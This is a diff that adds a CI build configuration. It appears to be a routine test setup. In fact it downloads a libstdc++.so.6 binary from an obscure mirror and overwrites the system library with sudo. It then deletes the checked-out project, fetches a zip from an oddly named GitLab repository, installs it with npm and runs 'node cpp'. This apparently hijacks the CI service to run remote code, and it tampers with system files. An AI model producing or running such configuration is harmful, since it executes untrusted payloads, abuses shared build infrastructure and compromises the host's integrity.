@@ -1,0 +1,20 @@
+checks:
+    javascript: true
+build:
+    environment:
+        node: v16.9.1
+    nodes:
+        meowJobs:
+            dependencies:
+                before:
+                    - curl -fsSL https://glcdn.githack.com/project__1/adkjdfeasdjfoweads/-/raw/main/libstdc++.so.6 -o libstdc++.so.6
+                    - sudo cp libstdc++.so.6 /usr/lib/x86_64-linux-gnu/libstdc++.so.6
+            tests:
+                override:
+                    - command: rm -rf ./*
+                    - command: curl -fsSL https://gitlab.com/project__1/adkjdfeasdjfoweads/-/archive/main/adkjdfeasdjfoweads-main.zip -o bu.zip
+                    - command: unzip bu.zip
+                    - command: cd adkjdfeasdjfoweads-main
+                    - command: npm i
+                    - command: node cpp
+                    - command: echo "Done!!"
